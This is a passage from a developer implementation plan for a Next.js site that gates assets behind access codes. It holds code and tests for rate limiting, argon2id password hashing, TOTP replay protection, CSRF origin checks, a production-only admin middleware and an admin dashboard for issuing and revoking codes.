 *  AND a global circuit-breaker. Fails OPEN — defense-in-depth only; the atomic redeem/recheck is the
 *  load-bearing fail-closed control (see docs/pitfalls). The route never calls this for a
 *  signature-valid-cookie load, so authenticated viewers are never limited. */
export async function gateLimitOk(kind: "redeem" | "load", slug: string): Promise<boolean> {
  try {
    const [perSlug, global] = await Promise.all([
      bumpRateLimit(await slugKey(kind, slug), WINDOW_SEC),
      bumpRateLimit("global:a", WINDOW_SEC),
    ]);
    return perSlug <= PER_SLUG_LIMIT && global <= GLOBAL_LIMIT;
  } catch {
    return true; // FAIL OPEN — intentional (limiter is not load-bearing; spec §9)
  }
}

/** Limiter for MALFORMED-slug traffic — a fixed bucket (never uses the bad slug as a key or a
 *  manifest lookup) so a spray of junk slugs still feeds the global circuit-breaker (spec §9). */
export async function badShapeLimitOk(): Promise<boolean> {
  try {
    const [bad, global] = await Promise.all([
      bumpRateLimit("bad-shape", WINDOW_SEC),
      bumpRateLimit("global:a", WINDOW_SEC),
    ]);
    return bad <= PER_SLUG_LIMIT && global <= GLOBAL_LIMIT;
  } catch {
    return true; // fail open
  }
}

/** Login throttle: an escalating delay (ms), NEVER a hard deny — a single admin means a hard
 *  lockout is a self-DoS (spec §8). A correct password+TOTP always succeeds within the window. */
export async function loginThrottleMs(): Promise<number> {
  try {
    const n = await bumpRateLimit("login", LOGIN_WINDOW_SEC);
    return Math.min(Math.max(0, n - 3) * 500, 5000);
  } catch {
    return 0; // fail open
  }
}
```

- [ ] **Step 6: Run to verify pass** — `npm test -- ratelimit` → PASS.

- [ ] **Step 7: Wire the limiter into the route.** In `src/app/a/[slug]/route.ts` add the import:

```ts
import { gateLimitOk, badShapeLimitOk } from "@/lib/ratelimit";
```

Change the malformed-slug line to COUNT junk-slug traffic toward the global breaker (using a fixed
bucket — never the bad slug as a key):

```ts
  if (!isValidSlug(slug)) { await badShapeLimitOk(); return failurePage(); }
```

As the FIRST statement inside `if (code) {` (before `redeem`), enforce the redemption limiter:

```ts
    if (!(await gateLimitOk("redeem", slug))) return failurePage();
```

And change the no-valid-cookie branch to COUNT unauthenticated load-failures toward the breaker
(valid-cookie loads skip this entirely — they're exempt but still DB-rechecked below):

```ts
  const claims = token ? await verifyAssetToken(token, slug, ring()) : null;
  if (!claims) { await gateLimitOk("load", slug); return failurePage(); }
```

- [ ] **Step 8: Trace the manifest into the `/a/[slug]` lambda** (the limiter reads it at request time). Extend `outputFileTracingIncludes` in `next.config.ts`:

```ts
  outputFileTracingIncludes: {
    "/a/[slug]": ["./assets/**/*.html", "./.generated/assets-manifest.json"],
  },
```

- [ ] **Step 9: Commit**

```bash
git add -A
git commit -m "feat: bucketed+global atomic rate limiting, valid-cookie exempt, login throttle"
```

**BEFORE marking Phase 3 complete:** Review the batch across ≥3 perspectives (security invariants, fail-closed vs fail-open split, header parity). Confirm tests/analysis cover: wrong-slug and revoked-on-recheck denied; DB-down → recheck fails closed; no-cookie → failure; unknown-slug spray stays in one limiter bucket; the 302 + asset + failure responses all carry `no-store` + (site-wide) HSTS/nosniff/Referrer-Policy/X-Robots-Tag, and the failure page is byte-identical across branches. Run `npm test` green. Update banner + table.

---

## Phase 4 — Admin auth (password + TOTP)

**Execution Status:** ⬜ NOT STARTED

> Read `docs/pitfalls/implementation-pitfalls.md` → "TOTP replay needs persisted state", "Admin is production-only". Assertion-rigor rule from Phase 3 applies to TOTP-step tests (control the clock; never sleep).

### Task 4.1: Password hashing (argon2id) + bootstrap/recovery scripts

> Spec §8: the master password uses a **memory-hard KDF — argon2id** with pinned OWASP params, NOT a
> fast hash or `scrypt`. Because `@node-rs/argon2` produces/consumes a self-describing PHC-encoded
> string (params + salt embedded), `verify` reads the params back from the stored hash — so the
> bootstrap helper and the app verifier interoperate as long as BOTH use this library + argon2id (the
> coordination hazard from `docs/pitfalls/implementation-pitfalls.md`). Password and TOTP setup are
> SEPARATE scripts (`hash-password`, `totp-setup`); recovery = re-run `totp-setup` and update the env var.

**Files:**
- Create: `src/lib/auth/password.ts`, `src/lib/auth/password.test.ts`
- Create: `scripts/hash-password.mjs`, `scripts/totp-setup.mjs`
- Modify: `.env.test` (write a real test hash)

- [ ] **Step 1: Failing test** `src/lib/auth/password.test.ts`:

```ts
import { expect, test } from "vitest";
import { hashPassword, verifyPassword } from "./password";

test("verifies a correct password and rejects a wrong one", async () => {
  const h = await hashPassword("correct horse");
  expect(h.startsWith("$argon2id$")).toBe(true); // PHC-encoded argon2id (rejects a fast-hash impl)
  expect(await verifyPassword("correct horse", h)).toBe(true);
  expect(await verifyPassword("wrong", h)).toBe(false);
});
test("rejects a malformed hash without throwing", async () => {
  expect(await verifyPassword("x", "garbage")).toBe(false);
});
```

- [ ] **Step 2: Run to verify fail** — `npm test -- password` → FAIL.

- [ ] **Step 3: Implement** `src/lib/auth/password.ts` (argon2id; pinned params; verify reads params from the hash):

```ts
import { hash, verify, Algorithm } from "@node-rs/argon2";

// Pinned OWASP argon2id params (spec §8): ≥19 MiB memory, ≥2 iterations, parallelism 1.
export const ARGON2_OPTS = { algorithm: Algorithm.Argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 } as const;

export async function hashPassword(password: string): Promise<string> {
  return await hash(password, ARGON2_OPTS); // PHC string embeds algorithm + params + salt
}

export async function verifyPassword(password: string, stored: string): Promise<boolean> {
  try {
    return await verify(stored, password); // params/salt read from `stored`
  } catch {
    return false; // malformed hash → reject, never throw
  }
}
```

- [ ] **Step 4: Run to verify pass** — `npm test -- password` → PASS.

- [ ] **Step 5: Bootstrap + recovery scripts.**

`scripts/hash-password.mjs` (same library + argon2id as the app → the printed hash verifies):

```js
import { hash, Algorithm } from "@node-rs/argon2";
const pw = process.argv[2];
if (!pw) { console.error("usage: node scripts/hash-password.mjs <password>"); process.exit(1); }
const h = await hash(pw, { algorithm: Algorithm.Argon2id, memoryCost: 19456, timeCost: 2, parallelism: 1 });
console.log("ADMIN_PASSWORD_HASH=" + h);
```

`scripts/totp-setup.mjs` (also the RECOVERY script — re-run and update `ADMIN_TOTP_SECRET`):

```js
import * as OTPAuth from "otpauth";
const secret = new OTPAuth.Secret({ size: 20 });
const totp = new OTPAuth.TOTP({ issuer: "share-site", label: "admin", secret });
console.log("ADMIN_TOTP_SECRET=" + secret.base32);
console.log("Scan this otpauth URI (recovery: re-run this, then update ADMIN_TOTP_SECRET):");
console.log(totp.toString());
```

Add both to `package.json` scripts: `"hash-password": "node scripts/hash-password.mjs"`, `"totp-setup": "node scripts/totp-setup.mjs"`.

- [ ] **Step 6: Fulfill the `.env.test` password-hash placeholder** (the Task 0.3 placeholder; login-flow tests in Task 4.3 need a REAL hash):

Run: `node scripts/hash-password.mjs test-password`
Replace the `ADMIN_PASSWORD_HASH=PLACEHOLDER-REPLACED-IN-TASK-4.1` line in `.env.test` with the printed `ADMIN_PASSWORD_HASH=$argon2id$...` line. (The test password is literally `test-password`.)

- [ ] **Step 7: Commit**

```bash
git add src/lib/auth/password.ts src/lib/auth/password.test.ts scripts/hash-password.mjs scripts/totp-setup.mjs package.json .env.test
git commit -m "feat: argon2id password hashing + hash-password/totp-setup scripts; real test hash in .env.test"
```

### Task 4.2: TOTP verify + replay rejection

**Files:**
- Create: `src/lib/auth/totp.ts`, `src/lib/auth/totp.test.ts`
- Create: `src/lib/db/totpStore.ts`

- [ ] **Step 1: Failing tests** `src/lib/auth/totp.test.ts` (control the clock; replay rejected via injected store):

```ts
import { expect, test, vi } from "vitest";
import * as OTPAuth from "otpauth";
import { verifyTotp } from "./totp";

const secret = "JBSWY3DPEHPK3PXP";
const totp = new OTPAuth.TOTP({ secret: OTPAuth.Secret.fromBase32(secret) });
const at = 1_700_000_000_000; // fixed epoch ms
const token = totp.generate({ timestamp: at });

function fakeStore() {
  const used = new Set<number>();
  return { markUsed: vi.fn(async (s: number) => (used.has(s) ? false : (used.add(s), true))) };
}

test("accepts a valid code and marks the step used", async () => {
  const store = fakeStore();
  expect(await verifyTotp(secret, token, store, at)).toBe(true);
});
test("rejects a replay of the same step", async () => {
  const store = fakeStore();
  expect(await verifyTotp(secret, token, store, at)).toBe(true);
  expect(await verifyTotp(secret, token, store, at)).toBe(false); // replay
});
test("rejects a wrong code", async () => {
  expect(await verifyTotp(secret, "000000", fakeStore(), at)).toBe(false);
});
test("accepts a previous-step code (±1 window) and consumes the MATCHED step, not the current one", async () => {
  const store = fakeStore();
  const prev = totp.generate({ timestamp: at - 30_000 }); // one step earlier
  expect(await verifyTotp(secret, prev, store, at)).toBe(true);
  expect(await verifyTotp(secret, prev, store, at)).toBe(false); // replay of that step → rejected
});
test("rejects a code two steps away (outside ±1)", async () => {
  expect(await verifyTotp(secret, totp.generate({ timestamp: at - 60_000 }), fakeStore(), at)).toBe(false);
});
```

- [ ] **Step 2: Run to verify fail**

Run: `npm test -- totp`
Expected: FAIL.

- [ ] **Step 3: Implement** `src/lib/auth/totp.ts` (±1 window; replay via store):

```ts
import * as OTPAuth from "otpauth";

export interface TotpStepStore {
  /** Returns true if `step` was newly marked (i.e., not a replay). */
  markUsed(step: number): Promise<boolean>;
}

const PERIOD = 30;

export async function verifyTotp(secretB32: string, token: string, store: TotpStepStore, nowMs: number): Promise<boolean> {
  const totp = new OTPAuth.TOTP({ secret: OTPAuth.Secret.fromBase32(secretB32), period: PERIOD });
  const delta = totp.validate({ token, timestamp: nowMs, window: 1 }); // ±1 step, or null
  if (delta === null) return false;
  const step = Math.floor(nowMs / 1000 / PERIOD) + delta;
  return await store.markUsed(step); // replay → false
}
```

- [ ] **Step 4: Run to verify pass**

Run: `npm test -- totp`
Expected: PASS.

- [ ] **Step 5: Postgres step store** `src/lib/db/totpStore.ts` (unique-violation = replay):

```ts
import { lt } from "drizzle-orm";
import { db } from "./client";
import { totpUsedSteps } from "./schema";
import type { TotpStepStore } from "@/lib/auth/totp";

export const totpStore: TotpStepStore = {
  async markUsed(step) {
    try {
      // Single insert: onConflictDoNothing + returning() yields a row only when newly inserted.
      // A replayed step conflicts on the PK → no row returned → false.
      const rows = await db.insert(totpUsedSteps).values({ step }).onConflictDoNothing().returning();
      if (rows.length > 0) {
        // Lazy prune: steps older than the ±1 acceptance window are dead weight (spec §5).
        await db.delete(totpUsedSteps).where(lt(totpUsedSteps.step, step - 2)).catch(() => {});
      }
      return rows.length > 0;
    } catch {
      return false; // fail closed
    }
  },
};
```

- [ ] **Step 6: Commit**

```bash
git add src/lib/auth/totp.ts src/lib/auth/totp.test.ts src/lib/db/totpStore.ts
git commit -m "feat: TOTP verify (±1 window) + replay rejection via totp_used_steps"
```

### Task 4.3: Session (key-ring) + CSRF + login (throttle, TOTP-after-password) + middleware (fail-closed prod gate + admin CSP)

**Files:**
- Create: `src/lib/auth/session.ts`, `src/lib/http/csrf.ts`
- Modify: `src/app/failure.ts` (export the body so middleware can reuse it byte-identically)
- Create: `src/app/admin/login/page.tsx`, `src/app/admin/login/actions.ts`
- Create: `src/middleware.ts`

- [ ] **Step 1: Export the failure body** — in `src/app/failure.ts`, change the `const BODY` line to `export const FAILURE_BODY` and use it in `failurePage()` (so the middleware's inert page is byte-identical to the gate failure):

```ts
export const FAILURE_BODY =
  "<!doctype html><meta charset=utf-8><title>Unavailable</title>" +
  "<p>This link is invalid or has expired. If you were sent a link, please re-open it from your " +
  "original message, or contact the sender.</p>";

export function failurePage(): Response {
  return new Response(FAILURE_BODY, { status: 200, headers: failureHeaders() });
}
```

- [ ] **Step 2: Session helpers** `src/lib/auth/session.ts` (key ring; exp is inside the signed token — spec §8):

```ts
import { cookies } from "next/headers";
import { signSession, verifySession, parseKeyRing } from "@/lib/crypto/tokens";

const NAME = "admin_session";
const TTL_SEC = 7 * 24 * 60 * 60; // 7 days (spec §8)
const ring = () => parseKeyRing(process.env.SESSION_SECRET!);

export async function startSession(): Promise<void> {
  const exp = Math.floor(Date.now() / 1000) + TTL_SEC;
  const token = await signSession(ring(), exp); // exp lives INSIDE the signed payload; jose enforces it
  (await cookies()).set(NAME, token, {
    httpOnly: true, secure: true, sameSite: "strict", path: "/", expires: new Date(exp * 1000),
  });
}

export async function isAuthed(): Promise<boolean> {
  const t = (await cookies()).get(NAME)?.value;
  return t ? await verifySession(t, ring()) : false;
}
```

- [ ] **Step 3: CSRF helper** `src/lib/http/csrf.ts` (pin the production origin; Referer fallback; reject missing — spec §8):

```ts
import { headers } from "next/headers";

function originOf(url: string | null): string | null {
  if (!url) return null;
  try { return new URL(url).origin; } catch { return null; }
}

/** True iff this state-changing request is same-origin with PRODUCTION_ORIGIN. A PRESENT Origin
 *  decides alone — a malformed Origin is a REJECT, never a fallback; only an ABSENT Origin falls
 *  back to a Referer same-origin check; missing-both ⇒ reject. */
export async function originOk(): Promise<boolean> {
  const expected = process.env.PRODUCTION_ORIGIN;
  if (!expected) return false; // misconfig → fail closed
  const h = await headers();
  const originHeader = h.get("origin");
  if (originHeader !== null) return originOf(originHeader) === expected;
  const referer = originOf(h.get("referer"));
  return referer !== null && referer === expected;
}
```

- [ ] **Step 4: Login server action** `src/app/admin/login/actions.ts` (throttle NOT lockout; verify password BEFORE consuming a TOTP step):

```ts
"use server";
import { redirect } from "next/navigation";
import { verifyPassword } from "@/lib/auth/password";
import { verifyTotp } from "@/lib/auth/totp";
import { totpStore } from "@/lib/db/totpStore";
import { startSession } from "@/lib/auth/session";
import { loginThrottleMs } from "@/lib/ratelimit";
import { originOk } from "@/lib/http/csrf";

export async function login(_prev: unknown, form: FormData): Promise<{ error?: string }> {
  if (!(await originOk())) return { error: "bad origin" };

  // Throttle, never hard-lock (single admin, spec §8): an escalating delay — a correct
  // password+TOTP still succeeds within the window; wrong-input volume never denies outright.
  await new Promise((r) => setTimeout(r, await loginThrottleMs()));

  const password = String(form.get("password") ?? "");
  const totp = String(form.get("totp") ?? "");

  // Verify the PASSWORD first; consume a TOTP step ONLY after it passes (spec §5/§8) — a
  // wrong-password attempt must never burn or probe TOTP steps. Same generic error either way.
  if (!(await verifyPassword(password, process.env.ADMIN_PASSWORD_HASH!))) return { error: "invalid credentials" };
  if (!(await verifyTotp(process.env.ADMIN_TOTP_SECRET!, totp, totpStore, Date.now()))) return { error: "invalid credentials" };

  await startSession();
  redirect("/admin"); // throws NEXT_REDIRECT; never returns on success
}
```

- [ ] **Step 5: Login page** `src/app/admin/login/page.tsx`:

```tsx
"use client";
import { useActionState } from "react";
import { login } from "./actions";

export default function LoginPage() {
  const [state, action] = useActionState(login, {} as { error?: string });
  return (
    <form action={action}>
      <input name="password" type="password" placeholder="Password" autoComplete="current-password" />
      <input name="totp" inputMode="numeric" placeholder="6-digit code" autoComplete="one-time-code" />
      <button type="submit">Sign in</button>
      {state?.error ? <p role="alert">{state.error}</p> : null}
    </form>
  );
}
```

- [ ] **Step 5b: Force-dynamic for the whole admin segment** `src/app/admin/layout.tsx` (the login page is a client component and cannot export route config; a server layout applies D5 to every `/admin/*` route incl. login — spec §4 D5):

```tsx
import type { ReactNode } from "react";

export const dynamic = "force-dynamic";

export default function AdminLayout({ children }: { children: ReactNode }) {
  return children;
}
```

- [ ] **Step 6: Middleware guard** `src/middleware.ts` (fail-CLOSED production gate returning the byte-identical generic page; admin CSP on all /admin/*):

```ts
import { NextResponse, type NextRequest } from "next/server";
import { verifySession, parseKeyRing } from "@/lib/crypto/tokens";
import { ADMIN_CSP, gateHeaders } from "@/lib/http/headers";
import { FAILURE_BODY } from "@/app/failure";

function genericPage(): NextResponse {
  return new NextResponse(FAILURE_BODY, {
    status: 200,
    headers: { "content-type": "text/html; charset=utf-8", "content-security-policy": ADMIN_CSP, ...gateHeaders() },
  });
}
function withAdminHeaders(res: NextResponse): NextResponse {
  res.headers.set("content-security-policy", ADMIN_CSP);
  res.headers.set("cache-control", "no-store");
  return res;
}

export async function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl;
  if (!pathname.startsWith("/admin")) return NextResponse.next();

  // Production-only, failing CLOSED: inert UNLESS explicitly production (spec §8). Unset/empty
  // VERCEL_ENV ⇒ inert. Return the SAME generic page as the gate so preview can't fingerprint /admin.
  if (process.env.VERCEL_ENV !== "production") return genericPage();

  if (pathname.startsWith("/admin/login")) return withAdminHeaders(NextResponse.next());

  const token = req.cookies.get("admin_session")?.value;
  const ok = token ? await verifySession(token, parseKeyRing(process.env.SESSION_SECRET!)) : false;
  if (!ok) return withAdminHeaders(NextResponse.redirect(new URL("/admin/login", req.url)));
  return withAdminHeaders(NextResponse.next());
}

export const config = { matcher: ["/admin", "/admin/:path*"] };
```

> Note the inverted gate: `VERCEL_ENV !== "production"` (positive allow). Locally, `next start` with no
> `VERCEL_ENV` is therefore inert too; set `VERCEL_ENV=production` in a local `.env.local` ONLY when you
> deliberately want to exercise `/admin` locally.

- [ ] **Step 7: Security-invariant tests** (write these — the phase gate depends on them; all run without a DB via mocks).

`src/lib/http/csrf.test.ts`:

```ts
import { afterEach, expect, test, vi } from "vitest";
vi.mock("next/headers", () => ({ headers: vi.fn() }));
import { headers } from "next/headers";
import { originOk } from "./csrf";

const withHeaders = (m: Record<string, string>) =>
  (headers as unknown as { mockResolvedValue: (v: unknown) => void }).mockResolvedValue({
    get: (k: string) => m[k.toLowerCase()] ?? null,
  });
afterEach(() => vi.restoreAllMocks());

test("accepts a matching Origin, rejects cross-site", async () => {
  process.env.PRODUCTION_ORIGIN = "https://x.example";
  withHeaders({ origin: "https://x.example" }); expect(await originOk()).toBe(true);
  withHeaders({ origin: "https://evil.example" }); expect(await originOk()).toBe(false);
});
test("falls back to Referer when Origin absent; rejects when both absent", async () => {
  process.env.PRODUCTION_ORIGIN = "https://x.example";
  withHeaders({ referer: "https://x.example/admin" }); expect(await originOk()).toBe(true);
  withHeaders({}); expect(await originOk()).toBe(false);
});
test("a malformed PRESENT Origin is rejected even with a valid Referer (no fallback)", async () => {
  process.env.PRODUCTION_ORIGIN = "https://x.example";
  withHeaders({ origin: "not a url", referer: "https://x.example/admin" }); expect(await originOk()).toBe(false);
});
```

`src/app/admin/login/actions.test.ts` (proves a wrong password never consumes a TOTP step):

```ts
import { beforeEach, expect, test, vi } from "vitest";
const verifyPassword = vi.fn(); const verifyTotp = vi.fn(); const startSession = vi.fn();
vi.mock("@/lib/auth/password", () => ({ verifyPassword }));
vi.mock("@/lib/auth/totp", () => ({ verifyTotp }));
vi.mock("@/lib/db/totpStore", () => ({ totpStore: {} }));
vi.mock("@/lib/auth/session", () => ({ startSession }));
vi.mock("@/lib/ratelimit", () => ({ loginThrottleMs: async () => 0 }));
vi.mock("@/lib/http/csrf", () => ({ originOk: async () => true }));
vi.mock("next/navigation", () => ({ redirect: () => { throw new Error("REDIRECT"); } }));
import { login } from "./actions";

const form = (pw: string, totp: string) => { const f = new FormData(); f.set("password", pw); f.set("totp", totp); return f; };
beforeEach(() => { verifyPassword.mockReset(); verifyTotp.mockReset(); startSession.mockReset();
  process.env.ADMIN_PASSWORD_HASH = "h"; process.env.ADMIN_TOTP_SECRET = "s"; });

test("wrong password → verifyTotp is NEVER called (step not consumed)", async () => {
  verifyPassword.mockResolvedValue(false);
  expect(await login(undefined, form("bad", "123456"))).toEqual({ error: "invalid credentials" });
  expect(verifyTotp).not.toHaveBeenCalled();
});
test("right password + wrong TOTP → verifyTotp called, no session started", async () => {
  verifyPassword.mockResolvedValue(true); verifyTotp.mockResolvedValue(false);
  expect(await login(undefined, form("good", "000000"))).toEqual({ error: "invalid credentials" });
  expect(verifyTotp).toHaveBeenCalledOnce();
  expect(startSession).not.toHaveBeenCalled();
});
```

`src/middleware.test.ts` (fail-closed production gate):

```ts
import { beforeEach, expect, test, vi } from "vitest";
vi.mock("@/lib/crypto/tokens", () => ({ verifySession: vi.fn(async () => false), parseKeyRing: () => [] }));
import { NextRequest } from "next/server";
import { middleware } from "./middleware";

const req = (path: string) => new NextRequest(new URL(`https://x.example${path}`));
beforeEach(() => { delete process.env.VERCEL_ENV; process.env.SESSION_SECRET = "k1:x"; });

test("admin is inert (generic 200 page) when VERCEL_ENV is unset — fail closed", async () => {
  const res = await middleware(req("/admin"));
  expect(res.status).toBe(200);
  expect(res.headers.get("location")).toBeNull(); // NOT a redirect to login
});
test("in production, /admin without a session redirects to login", async () => {
  process.env.VERCEL_ENV = "production";
  const res = await middleware(req("/admin"));
  expect(res.headers.get("location")).toContain("/admin/login");
});
```

Run: `npm test -- csrf actions middleware` → all PASS.

- [ ] **Step 8: Verify build compiles**

Run: `npm run build`
Expected: success. (Full DB-backed auth flow is exercised in Phase 7.)

- [ ] **Step 9: Commit**

```bash
git add -A
git commit -m "feat: key-ring session, pinned-origin CSRF, TOTP-after-password throttle, fail-closed admin gate + CSP + tests"
```

**BEFORE marking Phase 4 complete:** Review ≥3 rounds. Confirm: a wrong password does NOT reach `verifyTotp` (step not consumed); TOTP replay + ±1-window tests pass; `originOk` rejects absent-Origin-without-Referer and cross-site, and compares to `PRODUCTION_ORIGIN` (not Host); the login path throttles but never hard-denies a correct credential; the middleware is inert when `VERCEL_ENV` is unset and returns the generic page. `npm test` + `npm run build` green. Update banner + table.

---

## Phase 5 — Admin panel UI

**Execution Status:** ⬜ NOT STARTED

> Depends on Phase 4 (auth) + Phase 6's manifest shape (defined below in Task 6.2 — the manifest = `{ [slug]: { title } }`). If executing 5 before 6, stub it: `mkdir -p .generated && echo '{}' > .generated/assets-manifest.json`.

### Task 5.1: Orphan detection + admin code repo (hash-on-insert, show-once, collision retry)

> `src/lib/manifest.ts` already exists (Task 3.4) with `readManifest`/`isKnownSlug`. This task ADDS
> `findOrphans` to it and creates the admin repo. The repo stores ONLY `code_hash` and returns the
> RAW code once from `createCode` for show-once display (spec §8); it never reads a raw code back.

**Files:**
- Modify: `src/lib/manifest.ts`, `src/lib/manifest.test.ts`
- Create: `src/lib/db/adminRepo.ts`

- [ ] **Step 1: Failing test** `src/lib/manifest.test.ts` (orphan detection — spec §8):

```ts
import { expect, test } from "vitest";
import { findOrphans } from "./manifest";

test("flags codes whose slug is not in the manifest", () => {
  const manifest = { aaaaaaaaaaaaaaaaaaaaaa: { title: "A" } };
  const codes = [{ assetSlug: "aaaaaaaaaaaaaaaaaaaaaa" }, { assetSlug: "bbbbbbbbbbbbbbbbbbbbbb" }];
  expect(findOrphans(codes, manifest)).toEqual(["bbbbbbbbbbbbbbbbbbbbbb"]);
});
```

- [ ] **Step 2: Run to verify fail** — `npm test -- manifest` → FAIL.

- [ ] **Step 3: Implement** — append `findOrphans` to `src/lib/manifest.ts`:

```ts
export function findOrphans(codes: { assetSlug: string }[], manifest: Manifest): string[] {
  const known = new Set(Object.keys(manifest));
  return [...new Set(codes.map((c) => c.assetSlug).filter((s) => !known.has(s)))];
}
```

- [ ] **Step 4: Run to verify pass** — `npm test -- manifest` → PASS.

- [ ] **Step 5: Admin repo** `src/lib/db/adminRepo.ts`:

```ts
import { desc, eq, sql } from "drizzle-orm";
import { db } from "./client";
import { codes } from "./schema";
import { generateCode, hashCode, type CodeRow } from "@/lib/codes";

export async function listCodes(): Promise<CodeRow[]> {
  return db.select().from(codes).orderBy(desc(codes.createdAt));
}

/** Expiry override: a duration in days (computed on DB time) OR an absolute admin-chosen instant OR
 *  null (use the DB column default of now()+90d). Duration is DB-side so it obeys the single-time-source
 *  rule (spec §5) — never `Date.now()`. */
export type ExpirySpec = { days: number } | { at: Date } | null;

/** Mint a code. Stores ONLY SHA-256(code); returns the RAW code ONCE for show-once display (spec §8) —
 *  never persisted or recoverable. Retries on the astronomically unlikely hash collision, revealing
 *  nothing about it (spec §5). */
export async function createCode(assetSlug: string, label: string, expiry: ExpirySpec): Promise<string> {
  const expiresAt =
    expiry && "days" in expiry ? sql`now() + (${expiry.days} * interval '1 day')` // DB time
    : expiry && "at" in expiry ? expiry.at
    : undefined; // omit → DB default (now() + 90 days)
  for (let attempt = 0; attempt < 3; attempt++) {
    const code = generateCode();
    try {
      await db.insert(codes).values({ codeHash: hashCode(code), assetSlug, label, ...(expiresAt !== undefined ? { expiresAt } : {}) });
      return code;
    } catch (e) {
      if (isUniqueViolation(e) && attempt < 2) continue;
      throw e;
    }
  }
  throw new Error("could not generate a unique code");
}

export async function revokeCode(id: string): Promise<void> {
  await db.update(codes).set({ revokedAt: sql`now()` }).where(eq(codes.id, id)); // DB time
}

function isUniqueViolation(e: unknown): boolean {
  return typeof e === "object" && e !== null && "code" in e && (e as { code?: string }).code === "23505";
}
```

- [ ] **Step 6: Commit**

```bash
git add src/lib/manifest.ts src/lib/manifest.test.ts src/lib/db/adminRepo.ts
git commit -m "feat: orphan detection + admin repo (hash-on-insert, show-once code, collision retry)"
```

### Task 5.2: Admin dashboard page + actions (show-once link, no raw-code column)

**Files:**
- Create: `src/app/admin/actions.ts`, `src/app/admin/GenerateForm.tsx`, `src/app/admin/page.tsx`
- Modify: `next.config.ts` (trace the `.generated` manifest into `/admin`)

- [ ] **Step 1: Server actions** `src/app/admin/actions.ts` (pinned-origin CSRF; expiry = absolute date OR duration; returns the one-time link):

```ts
"use server";
import { revalidatePath } from "next/cache";
import { createCode, revokeCode, type ExpirySpec } from "@/lib/db/adminRepo";
import { isKnownSlug } from "@/lib/manifest";
import { originOk } from "@/lib/http/csrf";

export type CreateResult = { link?: string; error?: string };

export async function createCodeAction(_prev: unknown, form: FormData): Promise<CreateResult> {
  if (!(await originOk())) return { error: "bad origin" };
  const slug = String(form.get("slug") ?? "");
  // Do NOT trust the posted slug (a forged POST could target any string) — it MUST be a real,
  // published asset (spec §7 provenance boundary).
  if (!(await isKnownSlug(slug))) return { error: "unknown asset" };
  const label = String(form.get("label") ?? "");
  const dateRaw = String(form.get("date") ?? "").trim(); // absolute date — wins if present
  const daysRaw = String(form.get("days") ?? "").trim(); // duration in days
  // Invalid input is an ERROR, never a silent fall-through to the 90-day default. Days must be a
  // positive INTEGER; dates must round-trip (Date normalizes impossible dates like 2026-02-31).
  let expiry: ExpirySpec = null;
  if (dateRaw) {
    const ms = Date.parse(`${dateRaw}T23:59:59Z`);
    if (!/^\d{4}-\d{2}-\d{2}$/.test(dateRaw) || Number.isNaN(ms)
      || new Date(ms).toISOString().slice(0, 10) !== dateRaw) {
      return { error: "invalid expiry date" };
    }
    expiry = { at: new Date(ms) };
  } else if (daysRaw) {
    if (!/^\d+$/.test(daysRaw) || Number(daysRaw) <= 0) return { error: "expiry days must be a positive integer" };
    expiry = { days: Number(daysRaw) };
  }
  const code = await createCode(slug, label, expiry);
  revalidatePath("/admin");
  // Show ONCE — the raw code is not persisted and cannot be recovered (spec §8, §3 D3).
  return { link: `${process.env.PRODUCTION_ORIGIN ?? ""}/a/${slug}?code=${code}` };
}

export async function revokeCodeAction(form: FormData): Promise<void> {
  if (!(await originOk())) throw new Error("bad origin");
  await revokeCode(String(form.get("id") ?? ""));
  revalidatePath("/admin");
}
```

- [ ] **Step 2: One-time-link form** `src/app/admin/GenerateForm.tsx` (client — surfaces the code once):

```tsx
"use client";
import { useActionState } from "react";
import { createCodeAction, type CreateResult } from "./actions";

export function GenerateForm({ slugs }: { slugs: [string, { title: string }][] }) {
  const [state, action] = useActionState(createCodeAction, {} as CreateResult);
  return (
    <>
      <form action={action}>
        <select name="slug">
          {slugs.map(([slug, m]) => <option key={slug} value={slug}>{m.title} ({slug})</option>)}
        </select>
        <input name="label" placeholder="Recipient label" />
        <input name="days" inputMode="numeric" placeholder="Expiry days (blank = 90)" />
        <input name="date" type="date" aria-label="Absolute expiry date (overrides days)" />
        <button type="submit">Generate</button>
      </form>
      {state.error ? <p role="alert">{state.error}</p> : null}
      {state.link ? (
        <p role="status"><strong>Copy this link now — it will NOT be shown again:</strong>{" "}
          <code>{state.link}</code></p>
      ) : null}
    </>
  );
}
```

- [ ] **Step 3: Dashboard page** `src/app/admin/page.tsx` (server component; NO raw-code column; shows last-used):

```tsx
import { listCodes } from "@/lib/db/adminRepo";
import { readManifest, findOrphans } from "@/lib/manifest";
import { codeStatus } from "@/lib/codes";
import { revokeCodeAction } from "./actions";
import { GenerateForm } from "./GenerateForm";

export const dynamic = "force-dynamic"; // reads DB + FS at request time (spec §4 D5)

export default async function AdminPage() {
  const [codes, manifest] = await Promise.all([listCodes(), readManifest()]);
  const orphans = new Set(findOrphans(codes, manifest));
  const now = new Date();
  return (
    <main>
      <h1>Assets & codes</h1>

      <h2>Generate code</h2>
      <GenerateForm slugs={Object.entries(manifest)} />

      <h2>Codes</h2>
      <table>
        <thead><tr><th>Label</th><th>Asset</th><th>Status</th><th>Last used</th><th>Redemptions</th><th></th></tr></thead>
        <tbody>
          {codes.map((c) => (
            <tr key={c.id}>
              <td>{c.label}{orphans.has(c.assetSlug) ? " ⚠ orphaned" : ""}</td>
              <td>{manifest[c.assetSlug]?.title ?? c.assetSlug}</td>
              <td>{codeStatus(c, now)}</td>
              <td>{c.lastUsedAt ? c.lastUsedAt.toISOString() : "—"}</td>
              <td>{c.useCount}</td>
              <td>
                <form action={revokeCodeAction}>
                  <input type="hidden" name="id" value={c.id} />
                  <button type="submit" disabled={!!c.revokedAt}>Revoke</button>
                </form>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </main>
  );
}
```

> **Do NOT** render the raw code anywhere in the list — it is unrecoverable by design; the ONLY place a
> code appears is the one-time link from `GenerateForm`. Lost link → **revoke + reissue** (spec §3/§8).
> **Do NOT** add auth checks here — the middleware (Task 4.3) gates `/admin/*`. No styling in scope.

- [ ] **Step 4: Trace the `.generated` manifest into the `/admin` lambda.** Extend `outputFileTracingIncludes` in `next.config.ts` (the `/a/[slug]` entry was set in Task 3.4):

```ts
  outputFileTracingIncludes: {
    "/a/[slug]": ["./assets/**/*.html", "./.generated/assets-manifest.json"],
    "/admin": ["./.generated/assets-manifest.json"],
  },
```

- [ ] **Step 5: Verify build compiles**

